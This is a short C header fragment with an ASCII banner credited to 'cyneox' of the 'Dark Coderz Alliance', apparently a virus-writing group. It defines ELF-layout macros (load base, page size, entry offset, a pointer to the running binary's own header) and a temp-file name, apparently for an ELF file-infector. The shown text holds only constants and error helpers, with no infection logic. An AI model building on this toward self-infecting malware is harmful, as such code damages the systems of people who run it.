/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

extern int errno;
#define ELF_BASE 0x8048000
#define ELF_PAGE_SZ 0x1000
#define ELF_ENTRY_OFF 0x1
#define CURRENT ((Elf32_Ehdr*)ELF_BASE)
#define TEMP_FILE "Caline&Cyneox[2004].tmp"

#define ERROR(func) { fprintf(stderr,"__error__ (\033[31m"#func"\033[0m): %s\n",strerror(errno));return false; }
#define PRINT_ERROR fprintf(stderr,"__error__ :  %s\n",strerror(errno));
#define ALIGN_UP(x) (((x) + 15 ) & ~15)
